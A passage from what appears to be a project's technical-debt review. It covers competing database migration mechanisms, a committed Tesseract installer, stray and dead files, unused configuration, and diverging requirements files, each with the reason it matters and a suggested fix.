`src/add_doc_version.py`, `src/run_migration.py`, `src/update_existing_sessions.py`).
**Why it matters:** `alembic upgrade` operates on an empty side database, and if the URL were
pointed at the real one, `alembic revision --autogenerate` would emit `drop_table` for the
concept-map tables. With three competing mechanisms there is no reliable record of the
production schema.
**Direction:** choose one migration mechanism (open decision in `CLAUDE.md`). If Alembic:
derive the URL from the same setting `db.py` uses, import every model module in `env.py`,
create a baseline revision from the current schema, then retire `migrate_database()` and the
one-off scripts.

### T3 — Committed installer, stray and dead files, duplicate config (P2)
- `tests/samples/tesseract-ocr-w64-setup-5.5.0.20241111.exe` (21 MB installer) is committed.
- Stray root file `stop` (contains the text "Redis").
- `DATABASE_URL` is set in `docker-compose.yml` but unused; the SQLite path is hardcoded in
  `src/db.py`.
- In Docker, `REDIS_URL=redis://redis:6379/0` makes the semantic cache share DB 0 with the
  other caches (its local default is DB 1).
- Two different pinned dependency lists, both UTF-16LE with CRLF: Docker installs the root
  `requirements.txt`, while `src/requirements.txt` is an older local freeze that adds `torch`,
  `transformers`, `sentence-transformers`, `pywin32`, and a newer `pypdf`, and lacks `Authlib`,
  `bcrypt`, `email-validator`, `dnspython`, and `itsdangerous`.
- Never imported in `src/`: `langchain*`, `langgraph*`, `langsmith`, `instructor`,
  `tiktoken`, `qdrant-client`.
- Dead code: `src/frontend.py` (Streamlit stub), `frontend/src/components/MessageBubble.js`.

**Why it matters:** the installer bloats every clone; unused config misleads readers
(`DATABASE_URL` suggests database support that doesn't exist); the two dependency
lists have already drifted apart; unused packages slow installs and inflate the Docker image.
**Direction:** delete the installer (document how to install Tesseract instead) — note that
this only stops the repo growing; purging it from history requires a history rewrite and
force-push, so decide that deliberately. Delete the stray and dead files, drop
`DATABASE_URL` or make `db.py` read it, keep a single UTF-8 `requirements.txt`, and prune
dependencies not tied to a planned item (`tiktoken` → C1, `instructor` → S1, `langsmith` →
O1, `langgraph` → A1).
